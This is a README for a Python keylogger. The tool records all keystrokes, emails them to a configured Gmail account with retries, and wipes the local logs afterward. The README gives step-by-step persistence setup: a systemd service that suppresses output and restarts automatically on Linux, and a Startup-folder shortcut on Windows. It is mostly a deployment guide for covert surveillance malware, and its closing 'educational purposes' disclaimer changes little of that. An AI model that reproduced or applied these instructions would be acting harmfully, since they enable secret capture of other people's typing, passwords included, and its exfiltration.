

# Keylogger Script

This repository contains a Python-based keylogger script that logs keystrokes and sends them via email. It includes robust error handling, log management, and retry mechanisms for email delivery.

![Keylogger Example](https://imgur.com/dAyA3DS.png)

## Features

- **Keystroke Logging:** Captures all keystrokes, including special keys like `Enter`, `Backspace`, and `Space`.
- **Email Notification:** Sends the logged keystrokes to a specified email address.
- **Retry Mechanism:** Retries email sending up to 3 times in case of failures.
- **Log Management:** Clears logs after successfully sending them via email to prevent clutter.
- **Graceful Exit:** Stops logging and sends logs when the `Esc` key is pressed.
- **Automatic Startup:** Instructions included for setting up the script to run automatically at system startup (Linux and Windows).

## Prerequisites

1. Python 3.x
2. Required Python libraries:
   ```bash
   pip install pynput
   ```
3. A Gmail account with app-specific password (if 2-Step Verification is enabled). Refer to the [Google App Passwords Guide](https://support.google.com/accounts/answer/185833?hl=en) to create one.

## Configuration

Update the following variables in the script with your email credentials:

```python
EMAIL_ADDRESS = 'your-email@gmail.com'
EMAIL_PASSWORD = 'your-app-password'
SMTP_SERVER = 'smtp.gmail.com'
SMTP_PORT = 587
```

## Usage

### Running the Script

Run the script in your terminal:

```bash
python3 keylogger.py
```

### Stopping the Script

Press the `Esc` key to stop the keylogger. This will also send the collected logs to the configured email address and clear the log file.

### Automatic Startup Setup

#### Linux (Using Systemd)

1. Create a systemd service file:
   ```bash
   sudo nano /etc/systemd/system/keylogger.service
   ```

2. Add the following content:

   ```ini
   [Unit]
   Description=Keylogger Script
   After=multi-user.target

   [Service]
   ExecStart=/usr/bin/python3 /path/to/keylogger.py
   WorkingDirectory=/path/to
   StandardOutput=null
   StandardError=null
   Restart=always

   [Install]
   WantedBy=multi-user.target
   ```

   Replace `/path/to/keylogger.py` with the full path to your script.

3. Reload systemd and enable the service:
   ```bash
   sudo systemctl daemon-reload
   sudo systemctl enable keylogger.service
   sudo systemctl start keylogger.service
   ```

4. Verify the service is running:
   ```bash
   sudo systemctl status keylogger.service
   ```

#### Windows

1. Press `Win + R` and type `shell:startup`, then press Enter.
2. Create a shortcut in the Startup folder with the following target:
   ```
   C:\Python39\python.exe C:\path\to\keylogger.py
   ```
3. The script will run automatically on login.

## Security Notice

This script is for educational purposes only. Unauthorized use of keyloggers is illegal and unethical. Use it responsibly and only on systems where you have explicit permission.

## Disclaimer

The author is not responsible for any misuse of this script. Always use it in compliance with applicable laws and regulations.
